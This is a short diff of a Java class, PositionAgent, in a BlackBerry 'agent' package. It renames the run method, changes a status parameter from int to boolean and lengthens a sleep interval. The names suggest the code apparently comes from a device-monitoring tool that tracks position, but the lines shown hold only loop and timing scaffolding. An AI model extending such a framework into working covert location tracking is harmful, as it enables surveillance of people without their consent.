@@ -6,16 +6,16 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class PositionAgent extends Agent {
     static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
 
-    public PositionAgent(int agentStatus) {
+    public PositionAgent(boolean agentStatus) {
         super(AGENT_POSITION, agentStatus, true);
     }
 
-    protected PositionAgent(int agentStatus, byte[] confParams) {
+    protected PositionAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
         int loop = 0;
 
@@ -23,7 +23,7 @@ public class PositionAgent extends Agent {
             debug.trace("loop:" + loop);
             ++loop;
 
-            if (agentSleep(1000)) {
+            if (smartSleep(10000)) {
                 debug.trace(loop + " clean stop");
                 return;
             }
